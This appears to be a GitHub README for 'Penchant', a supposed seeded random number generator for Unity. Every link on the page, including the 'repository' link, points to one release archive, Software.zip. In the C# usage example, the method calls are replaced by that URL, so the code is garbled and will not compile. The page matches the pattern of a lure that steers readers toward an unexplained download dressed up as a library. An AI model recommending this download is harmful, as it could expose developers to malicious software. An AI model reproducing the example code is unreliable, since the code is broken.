# 🎲 Penchant - A Seeded Random Number Generator for Unity 🎲

[![Penchant](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip%20Penchant-v1.0.0-brightgreen)](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip)

---

Penchant is a simple and elegant seeded random number generator designed specifically for Unity game development. With Penchant, you can easily incorporate random number generation with specific seeds into your Unity projects, providing a reliable way to generate randomness while retaining reproducibility for debugging and testing purposes.

## Features
- 🌟 Easy to use API for generating seeded random numbers.
- 🎮 Seamless integration with Unity game development environment.
- 🌈 Supports a wide range of seed values for diverse random number sequences.
- 🧩 Lightweight and efficient implementation for high performance.

## Installation
You can download the latest version of Penchant from the link below:
[![Download Penchant](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip%20Penchant-v1.0.0-blue)](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip)

Once downloaded, simply extract the contents and integrate the Penchant plugin into your Unity project to start using the seeded random number generator right away.

## Usage
Using Penchant in your Unity project is straightforward. Here is an example of how you can generate a random integer with a specific seed using Penchant:

```csharp
using UnityEngine;
using Penchant;

public class RandomNumberGenerator : MonoBehaviour
{
    void Start()
    {
        // Set a seed value for the random number generator
        int seed = 12345;

        // Create a Penchant instance with the specified seed
        PenchantGenerator generator = new PenchantGenerator(seed);

        // Generate a random integer between 0 and 100
        int randomNumber = https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip(0, 100);

        https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip("Random Number: " + randomNumber);
    }
}
```

By following this example, you can easily incorporate Penchant into your Unity scripts to add randomness to your game logic with a specific seed.

## Contributing
Feel free to contribute to the development of Penchant by submitting pull requests or reporting issues on the [GitHub repository](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip). Your contributions are highly appreciated!

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

🚀 Start using Penchant in your Unity projects today and level up your random number generation game! 🎲